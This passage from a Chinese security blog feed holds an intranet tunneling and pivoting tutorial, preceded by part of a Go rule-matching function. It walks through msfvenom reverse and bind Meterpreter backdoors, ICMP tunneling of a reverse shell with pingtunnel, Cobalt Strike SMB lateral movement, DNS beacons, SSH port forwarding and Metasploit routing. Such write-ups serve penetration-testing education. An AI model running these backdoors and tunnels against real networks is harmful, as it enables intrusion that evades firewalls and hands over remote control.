stack.Pop())<br>&#125;<br><span class="hljs-keyword">return</span> output<br>&#125;<br></code></pre></td></tr></table></figure><p>后缀表达式运算：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(info *Info)</span></span> matchMultipleRules(rules <span class="hljs-type">string</span>) <span class="hljs-type">bool</span> &#123;<br>stack := Stack&#123;&#125;<br>tokens := infixToPostfix(rules, info)<br><span class="hljs-keyword">var</span> c <span class="hljs-type">bool</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(tokens) == <span class="hljs-number">1</span> &#123;<br>parseBool, err := strconv.ParseBool(tokens[<span class="hljs-number">0</span>])<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br><span class="hljs-keyword">return</span> parseBool<br>&#125;<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">len</span>(tokens); i++ &#123;<br><span class="hljs-keyword">if</span> strings.Contains(tokens[i], <span class="hljs-string">&quot;||&quot;</span>) || strings.Contains(tokens[i], <span class="hljs-string">&quot;&amp;&amp;&quot;</span>) &#123;<br>a, _ := strconv.ParseBool(stack.Pop())<br>b, _ := strconv.ParseBool(stack.Pop())<br><span class="hljs-keyword">if</span> strings.Contains(tokens[i], <span class="hljs-string">&quot;||&quot;</span>) &#123;<br>c = a || b<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>c = a &amp;&amp; b<br>&#125;<br>stack.Push(strconv.FormatBool(c))<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>stack.Push(tokens[i])<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> c<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="待完善"><a href="#待完善" class="headerlink" title="待完善"></a>待完善</h2><p>待完善问题：</p><ul><li>提取 <code>chunsou</code> 中的 <code>ico_hash</code> 添加到指纹中</li><li>200 状态码通过远程加载 JS 实现页面跳转</li></ul>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>安全开发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>隧道代理</title>
    <link href="/2023/08/22/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1/"/>
    <url>/2023/08/22/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1/</url>
    
    <content type="html"><![CDATA[<h1 id="隧道代理"><a href="#隧道代理" class="headerlink" title="隧道代理"></a>隧道代理</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>隧道技术：解决不出网协议上线问题（ 利用出网协议进行封装 ）</p><p>代理技术：解决网络通讯不通的问题（ 利用跳板机建立节点后续操作 ）</p><p>防火墙：</p><ol><li><p>入站规则：外 &#x3D;&gt; 内</p></li><li><p>出站规则：内 &#x3D;&gt; 外</p></li></ol><p>后门：</p><ol><li>正向连接：靶机将 shell 放到本地，攻击机主动连接靶机 shell（ 攻击机 &#x3D;&gt; 靶机 ，我主动联系，入站）</li><li>反向连接：靶机直接上 shell 发送给攻击机，攻击机监听本地端口 （ 靶机 &#x3D;&gt; 攻击机，我等他联系，出站 ）</li></ol><p>受防火墙影响时，也可以不使用隧道、代理技术，直接去关闭防火墙、修改出入站规则、修改规则白名单程序。但是这种操作需要有一个前提条件，那就是该用户有足够的权限。在没有域的内网环境中，只要该用户权限够高即可；但在存在域的内网环境中，域控是可以设置组策略防火墙同步，该策略只有域控才能关闭，所以直接干防火墙适用于以下两种情况：</p><ol><li>无域内网环境</li><li>域控没有设置组策略防火墙同步</li></ol><h2 id="隧道技术"><a href="#隧道技术" class="headerlink" title="隧道技术"></a>隧道技术</h2><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308141153774.png" alt="隧道技术"></p><h3 id="基础知识-1"><a href="#基础知识-1" class="headerlink" title="基础知识"></a>基础知识</h3><p>思路：根据防火墙的入站或出站限制，选择正向或者反向的后门，在利用不同的协议实现通信。</p><ol><li>入站无限制：正向连接</li><li>出站无限制：反向连接</li><li>入站、出站都有限制：反向连接 + 隧道技术（ 考虑限制内容 ）</li></ol><p>隧道技术：向下兼容</p><p>如：当 TCP 协议被禁止，可尝试 ICMP 这种向下的协议。</p><table><thead><tr><th>模型</th><th>隧道技术</th></tr></thead><tbody><tr><td>应用层</td><td>SSH、HTTP&#x2F;S、DNS</td></tr><tr><td>传输层</td><td>TCP、UDP</td></tr><tr><td>网络层</td><td>IPv6、ICMP</td></tr></tbody></table><p>判断协议是否可以使用：</p><table><thead><tr><th>协议</th><th>windows</th><th>linux</th></tr></thead><tbody><tr><td>ICMP</td><td><code>ping</code></td><td><code>ping</code></td></tr><tr><td>SSH</td><td></td><td><code>ssh</code></td></tr><tr><td>DNS</td><td><code>nslookup</code></td><td><code>dig</code>、<code>nslookup</code></td></tr><tr><td>SMB</td><td>445 端口</td><td></td></tr></tbody></table><h3 id="ICMP隧道技术"><a href="#ICMP隧道技术" class="headerlink" title="ICMP隧道技术"></a>ICMP隧道技术</h3><p>ICMP 是依靠 ping 命令去和远端主机进行通信的，ICMP 隧道技术就是在通信过程中将 TCP&#x2F;UDP 的数据都封装在 ICMP 的 ping 数据包中，从而绕过防火墙。</p><p>攻击过程：生成一个 lhost &#x3D; 127.0.0.1 的反向后门，靶机在执行后门后，会将 TCP 数据先反弹到靶机本地，然后在靶机上使用 <code>pingtunnel</code> 将 TCP 的数据封装为 ICMP 数据进行出网。出网后的数据是 ICMP ，所以需要在攻击机上启动 <code>pingtunnel</code>   解除封装为 TCP 使用。</p><p>简单来说隧道技术就是这样，将 shell 数据封装为出站不限制的协议进行出站：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308141153828.png" alt="ICMP"></p><p>ICMP 隧道工具：</p><ul><li>pingtunnel：<a href="https://github.com/esrrhs/pingtunnel">https://github.com/esrrhs/pingtunnel</a></li><li>impacket：<a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></li><li>icmpsh：<a href="https://github.com/bdamele/icmpsh">https://github.com/bdamele/icmpsh</a></li><li>spp：<a href="https://github.com/esrrhs/spp">https://github.com/esrrhs/spp</a></li></ul><p>演示环境：</p><ul><li>KALI：192.168.254.129</li><li>Windows Server 2019：192.168.254.128</li><li>防火墙环境：出站、入站均限制 TCP</li></ul><h4 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h4><p>生成 3333 端口的反向后门，先让 shell 反弹到靶机本地 3333 端口：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/x64/meterpreter/reverse_tcp <span class="hljs-attribute">lhost</span>=0.0.0.0 <span class="hljs-attribute">lport</span>=3333 -f exe -o msf.exe<br></code></pre></td></tr></table></figure><p>监听 4444 端口（ pingtunnel 将 ICMP 转发到 4444 端口 ）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/reverse_tcp<br><span class="hljs-built_in">set</span> lhost 0.0.0.0<br>run<br></code></pre></td></tr></table></figure><p>启动 pingtunnel server，处理出网的 ICMP 数据：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">./pingtunnel -<span class="hljs-keyword">type</span> <span class="hljs-type">server </span>-noprint <span class="hljs-number">1</span> -nolog <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>将反弹到本地 3333 的 shell 封装为 ICMP 转发到 KALI 的 4444 ： </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pingtunnel</span>.exe -type client -l <span class="hljs-number">127.0.0.1:3333</span> -s <span class="hljs-number">192.168.254.128</span> -t <span class="hljs-number">192.168.254.128:4444</span> -tcp <span class="hljs-number">1</span> -noprint <span class="hljs-number">1</span> -nolog <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h4 id="CS"><a href="#CS" class="headerlink" title="CS"></a>CS</h4><p>添加监听器，同 MSF：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230805111931597.png" alt="image-20230805111931597"></p><p>生成后门 ( <strong>stageless</strong> ）：</p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230805110324509.png" alt="image-20230805110324509" style="zoom:67%;" /><p>然后流程同 MSF，使用 pingtunnel 将本地 3333 封装为 ICMP ，pingtunnel server 解除封装，获取 shell。</p><h3 id="SMB隧道技术"><a href="#SMB隧道技术" class="headerlink" title="SMB隧道技术"></a>SMB隧道技术</h3><p>SMB 隧道技术不同于 ICMP 隧道，ICMP 隧道是通过 将 TCP 协议数据封装为 ICMP 以绕过防火墙出站限制，而 SMB 隧道适合机器无法反向连接且开启 SMB 服务的情况。</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/ICMP.png" alt="ICMP"></p><p>环境介绍：</p><ul><li>web Server：入站规则（ 仅允许 80 端口 ）&#x3D;&gt; 已上线</li><li>printer Server：入站规则 （ 文件和打印机共享 SMB ）&#x3D;&gt; 未上线 （ 目标 ）</li></ul><p>目前上线情况：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230807205206558.png" alt="image-20230807205206558"></p><p>攻击过程：</p><p>通过反向代理直接上线 laptop，web Server 入站存在限制无法使用正向连接，所以通过 反向连接 + 代理转发上线。但到了 printer 这里，入站仅允许 SMB （ 无法正向 ），而反向出站到 web 又不行 （ 入站仅允许 80 端口 ）。</p><p>这里是正向、反向均无法上线，这就要用到 SMB 隧道技术了。SMB 隧道技术算是<strong>正向连接</strong>，web Server 在 printer Server 建立一条 SMB 通道，通过此通道进行上线。</p><p>SMB 隧道技术使用前提条件：</p><ol><li>目标开启 445 （ SMB ）</li><li>账号、密码</li></ol><p>先进行网络扫描，扫描 192.168.22.0 网段：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230807204657970.png" alt="image-20230807204657970"></p><p>然后再进行服务探测：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230807204728847.png" alt="image-20230807204728847"></p><p>发现 printer Server 开启了 445 端口，那么就可以使用 SMB 隧道。</p><p>首先创建 SMB 监听器：</p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230807205044372.png" alt="image-20230807205044372" style="zoom:67%;" /><p>然后建立 SMB 隧道：右键 &#x3D;&gt; 横向移动 &#x3D;&gt; pxexec64</p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230807205317483.png" alt="image-20230807205317483" style="zoom:67%;" /><p>成功上线：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230807205405680.png" alt="image-20230807205405680"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230807205746248.png" alt="image-20230807205746248"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230807205726348.png" alt="image-20230807205726348"></p><h3 id="DNS隧道技术"><a href="#DNS隧道技术" class="headerlink" title="DNS隧道技术"></a>DNS隧道技术</h3><p>DNS 隧道技术的使用首先需要有一个域名和一台公网机器，且目标靶机必须要可以出网，能够解析域名。且域名需要做好防护，否则被直接查到。</p><blockquote><p>这里域名已经到期了，不想续费，暂时没有实操。</p></blockquote><h4 id="上线"><a href="#上线" class="headerlink" title="上线"></a>上线</h4><p>首先设置域名解析记录：</p><p><code>A记录</code>-&gt;<code>cs主机名</code>-&gt;<code>CS服务器IP</code></p><p><code>NS记录</code>-&gt;<code>ns1主机名</code>-&gt;<code>A记录地址</code></p><p><code>NS记录</code>-&gt;<code>ns2主机名</code>-&gt;<code>A记录地址</code></p><p>然后在 CS 上面生成 DSN 的监听器：</p><ul><li>DNS 地址：ns 1 和 ns 2</li><li>DNS 地址（ Stager ）：A 记录</li></ul><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230809185027635.png" alt="image-20230809185027635" style="zoom:67%;" /><p>然后生成后门，靶机触发后门，会上线一个黑机子。</p><p>会话交互，执行命令即可上线：</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">mode</span> dns-txt<br></code></pre></td></tr></table></figure><h4 id="通讯"><a href="#通讯" class="headerlink" title="通讯"></a>通讯</h4><p>利用 DNS 技术实现通讯需要使用 <code>iodine</code> 工具，其工作原理是 ，通过 <code>TAP</code> 虚拟网卡，在服务端建立起一个局域网；在客户端，通过<code>TAP</code> 建立一个虚拟网卡；两者通过 <code>DNS</code> 隧道连接，处于同一个局域网。在客户端和服务端之间建立连接后，客户机上会多出一块名为<code>dns0</code> 的虚拟网卡。</p><p>参考链接：<a href="https://blog.csdn.net/weixin_44268918/article/details/131069608#t18">https://blog.csdn.net/weixin_44268918/article/details/131069608#t18</a></p><h3 id="SSH隧道技术"><a href="#SSH隧道技术" class="headerlink" title="SSH隧道技术"></a>SSH隧道技术</h3><p>SSH 隧道技术需要使用 Linux 主机且必须是 root 权限，且 SSH 隧道不涉及上线，类似于代理技术，使用 Linux 作为跳板机进行内网通讯。</p><p>主要分为：</p><ul><li>远程转发：将跳板机上访问的IP地址及端口流量转发至攻击机上的某个端口</li><li>本地转发：将跳板机上访问的IP地址及端口流量转发至跳板机本地的某个端口</li><li>动态转发：利用 ssh 隧道的正向 socks 代理把目标的整个内网代出来</li></ul><p><code>ssh</code> 参数说明：</p><ul><li><p>-C：压缩传输，提高传输速度</p></li><li><p>-f：将SSH传输转入后台执行，不占用当前的Shell</p></li><li><p>-N：建立静默连接(建立了连接，但是看不到具体会话)</p></li><li><p>-g：允许远程主机连接本地用于转发的端口</p></li><li><p>-L：本地端口转发</p></li><li><p>-R：远程端口转发</p></li><li><p>-D：动态转发(SOCKS代理)</p></li><li><p>-P：指定SSH端口</p></li></ul><h4 id="远程转发"><a href="#远程转发" class="headerlink" title="远程转发"></a>远程转发</h4><p>环境说明：</p><ul><li>攻击机：43.139.185.135</li><li>ubuntu：<ul><li>192.168.254.133（ 出网 ）</li><li>192.168.22.130</li></ul></li><li>windows Server 2019：192.168.22.129（ 80 端口 web 服务 ）</li></ul><p>目标：攻击机上可以访问 192.168.22.129 的 web</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ssh</span> -CfNg -R <span class="hljs-number">1010</span>:<span class="hljs-number">192.168.22.129:80</span> root@<span class="hljs-number">43.139.185.135</span><br></code></pre></td></tr></table></figure><p>将 192.168.22.129:80 的流量转发到远程 43.139.185.135:1010 上：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230814101212052.png" alt="image-20230814101212052"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230814101238395.png" alt="image-20230814101238395"></p><h4 id="本地转发"><a href="#本地转发" class="headerlink" title="本地转发"></a>本地转发</h4><p>本地转发这里需要攻击机可以访问到跳板机才行，所以这里测试环境攻击机换为  192.168.254.128。</p><p>环境说明：</p><ul><li>攻击机：192.168.254.128</li><li>ubuntu：<ul><li>192.168.254.133（ 出网 ）</li><li>192.168.22.130</li></ul></li><li>windows Server 2019：192.168.22.129（ 80 端口 web 服务 ）</li></ul><p>将 192.168.22.129:80 的流量转发到本地的 3333 端口，然后攻击机访问跳板机的 3333。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ssh</span> -CfNg -L <span class="hljs-number">3333</span>:<span class="hljs-number">192.168.22.129:80</span> root@<span class="hljs-number">192.168.254.133</span><br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230814101759539.png" alt="image-20230814101759539"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230814101739435.png" alt="image-20230814101739435"></p><h4 id="动态转发"><a href="#动态转发" class="headerlink" title="动态转发"></a>动态转发</h4><p>利用 ssh 隧道的正向 socks 代理把目标的整个内网代出来，任何支持socks 4&#x2F;5协议的程序都可以使用这个加密通道进行代理访问。</p><p>但是这个是需要攻击机上去执行 ssh 动态转发 跳板机，需要知道跳板机的 root 密码，感觉没有什么意义 …</p><p>环境说明：</p><ul><li>攻击机：192.168.254.128</li><li>ubuntu：<ul><li>192.168.254.133（ 出网 ）</li><li>192.168.22.130</li></ul></li><li>windows Server 2019：192.168.22.129（ 80 端口 web 服务 ）</li></ul><p>在攻击机上执行，把目标的整个内网代出来：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ssh</span> -D <span class="hljs-number">1212</span> root@<span class="hljs-number">192.168.254.133</span><br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230814103122932.png" alt="image-20230814103122932"></p><p>攻击机上设置 socket 代理（ 本地的 1212 ），即可访问 192.168.22.129:80 。</p><h2 id="代理技术"><a href="#代理技术" class="headerlink" title="代理技术"></a>代理技术</h2><h3 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a>正向连接</h3><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/%E4%BB%A3%E7%90%86%E7%8E%AF%E5%A2%83.png" alt="代理环境"></p><p>网络环境：</p><ul><li>winServer 1 出网，可上线</li><li>winServer 1 可与 winServer 2 通信，winServer 2 可与 winServer 3 通信</li></ul><p>在这种网络不能通讯的情况下，可利用代理技术来解决通信问题，即利用可控制的机器作为跳板机去控制不出网的机器。</p><p>上线思路：winServer 1 可出网，直接上线。然后 winServer 2 执行正向后门，通过 winServer 1 连接 winServer 2 正向后门，上线 winServer 2，winServer 3 同理。正向上线的思路相同，执行 CS、MSF 具体的方式不同。</p><h4 id="CS-1"><a href="#CS-1" class="headerlink" title="CS"></a>CS</h4><p>攻击思路：先上线 winServer 1，然后在 winServer 2 上建立正向连接后门，使 winServer 2 将 shell 放到本地的 xxxx 端口上，然后通过 winServer 1 去连接 winServer 2 shell 端口 （ 正向连接 ），完成 winServer 2 上线。winServer 3 同理，利用已上线的 winServer 2 作为跳板进行正向连接后门。</p><blockquote><p>建立监听器：</p></blockquote><p>反向 http：</p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230805180203718.png" alt="image-20230805180203718" style="zoom:50%;" /><p>正向连接 TCP：</p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230805180254854.png" alt="image-20230805180254854" style="zoom:50%;" /><p>攻击过程：</p><p>生成反向后门，上线 winServer 1：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230805181043495.png" alt="image-20230805181043495"></p><p>生成正向后门，winServer 2 执行，winServer 1 连接 winServer 2 正向后门：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">connect</span> <span class="hljs-number">192.168.11.129</span> <span class="hljs-number">4444</span><br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230805181008069.png" alt="image-20230805181008069"></p><p>同样操作，winServer 3 执行正向后门，winServer 2 连接：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">connect</span> <span class="hljs-number">192.168.22.129</span> <span class="hljs-number">4444</span><br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230805181220276.png" alt="image-20230805181220276"></p><h4 id="MSF-1"><a href="#MSF-1" class="headerlink" title="MSF"></a>MSF</h4><p>攻击思路：先控制 winServer 1，然后在 msf 中添加路由，使 msf 可访问 winServer 2，之后 winServer 2 执行正向后门，msf 连接，得到 winServer 2 的 shell，winServer 3 同理。</p><p>在 msf 这里，添加路由后即可访问内网资源。</p><p>攻击过程：</p><p>msf 生成反向后门，上线 winServer 1</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/x64/meterpreter/reverse_tcp <span class="hljs-attribute">lhost</span>=43.139.185.135 <span class="hljs-attribute">lport</span>=4444 -f exe -o msf_reverse.exe<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/multi/handler <br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/reverse_tcp<br><span class="hljs-built_in">set</span> lhost 0.0.0.0<br>run<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230806084252224.png" alt="image-20230806084252224"></p><p>添加路由，使 msf 可访问 192.168.11.0 网段</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">run</span> post/multi/manage/autoroute<br><span class="hljs-built_in">run</span> autoroute -p<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230806084450988.png" alt="image-20230806084450988"></p><p>生成正向后门，上线 winServer 2</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/meterpreter/bind_tcp <span class="hljs-attribute">LHOST</span>=0.0.0.0 <span class="hljs-attribute">LPORT</span>=4444 -f exe &gt; msf_bind.exe<br></code></pre></td></tr></table></figure><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> payload <span class="hljs-comment">windows</span>/meterpreter/<span class="hljs-comment">bind_tcp</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">rhost 192.168.11.129</span><br>run<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230806084744778.png" alt="image-20230806084744778"></p><p>继续添加路由，使 msf 可访问 192.168.22.0 网段</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">run post<span class="hljs-regexp">/multi/m</span>anage/autoroute<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230806084841127.png" alt="image-20230806084841127"></p><p>上线 winServer 3</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-keyword">set</span> rhost <span class="hljs-number">192.168</span><span class="hljs-number">.22</span><span class="hljs-number">.129</span><br><span class="hljs-built_in">run</span><br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230806085222662.png" alt="image-20230806085222662"></p><p>至此所有机器已经上线：</p><p>这里的 winServer 1 出网 IP 改变为 192.168.254.129</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230806085146725.png" alt="image-20230806085146725"></p><h3 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a>反向连接</h3><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E7%8E%AF%E5%A2%83.png" alt="反向代理环境"></p><p>现在的环境仅允许 laptop 访问 web Server 的 80 端口，那么上面的通过 laptop 正向连接 web Server，这种操作就不可行了。</p><p>这里就需要用到 反向连接 + 代理转发上线，web Server 反向连接到 laptop ，laptop 开启代理转发，监听端口获取  web Server 的 连接。</p><p>先 CS 上线 laptop，然后使用代理转发上线功能，在 laptop 的 192.168.11.128 上进行监听：</p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230807183427601.png" alt="image-20230807183427601" style="zoom: 67%;" /><p>监听地址选择 192.168.11.128 ，这样 web Server 才能将反向连接到 laptop。</p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230807183509351.png" alt="image-20230807183509351" style="zoom:67%;" /><p>然后 web Server 触发该监听器后门即可上线：</p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230807192504629.png" alt="image-20230807192504629" style="zoom:67%;" /><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230807192635114.png" alt="image-20230807192635114"></p><h3 id="代理转发"><a href="#代理转发" class="headerlink" title="代理转发"></a>代理转发</h3><p>当使用 MSF 、CS 以可控制机器作为跳板进行渗透时，我们攻击机的工具想要在不出网的环境下运行有两种方法，一是直接将工具上传到我们控制的不出网的机器上，另一种就是 “代理转发”，将内网的流量代理到本地进行访问，这样极大的方便了我们对内网进行横向渗透。</p><p>代理连接工具：</p><ul><li>windows：Proxifier、SocksCap</li><li>linux：proxychains</li></ul><h4 id="socks-代理"><a href="#socks-代理" class="headerlink" title="socks 代理"></a>socks 代理</h4><h5 id="CS-2"><a href="#CS-2" class="headerlink" title="CS"></a>CS</h5><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230805192708470.png" alt="image-20230805192708470" style="zoom:50%;" /><h5 id="MSF-2"><a href="#MSF-2" class="headerlink" title="MSF"></a>MSF</h5><p>先添加路由，然后在使用 socks_proxy 模块设置代理：</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gams">use auxiliary/server/socks_proxy<br><span class="hljs-keyword">set</span> srvhost <span class="hljs-comment">0.0.0.0</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">srvport 1115</span><br>run<br></code></pre></td></tr></table></figure><h4 id="代理工具"><a href="#代理工具" class="headerlink" title="代理工具"></a>代理工具</h4><h5 id="SocksCap"><a href="#SocksCap" class="headerlink" title="SocksCap"></a>SocksCap</h5><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230805192834634.png" alt="image-20230805192834634"></p><h5 id="Proxifier"><a href="#Proxifier" class="headerlink" title="Proxifier"></a>Proxifier</h5><ol><li>添加代理服务器：</li></ol><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230805194527109.png" alt="image-20230805194527109" style="zoom: 67%;" /><ol start="2"><li>检查，可连接代理服务器即可：</li></ol><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230805193216884.png" alt="image-20230805193216884" style="zoom: 67%;" /><ol start="3"><li>配置代理规则</li></ol><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230805194609133.png" alt="image-20230805194609133" style="zoom:67%;" /><h5 id="proxychain"><a href="#proxychain" class="headerlink" title="proxychain"></a>proxychain</h5><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sudo apt-<span class="hljs-built_in">get</span> install -y proxychains4<br></code></pre></td></tr></table></figure><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vim">git clone git@github.<span class="hljs-keyword">com</span>:rofl0r/proxychains-ng.git<br>sudo <span class="hljs-keyword">make</span><br>sudo <span class="hljs-keyword">make</span> install<br>sudo <span class="hljs-keyword">make</span> install-config<br></code></pre></td></tr></table></figure><p>编辑配置文件添加代理：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/etc/</span>proxychains4.conf<br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230806115704301.png" alt="image-20230806115704301"></p><p>在命令前面加上 <code>proxychains4</code> 即可使用代理：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 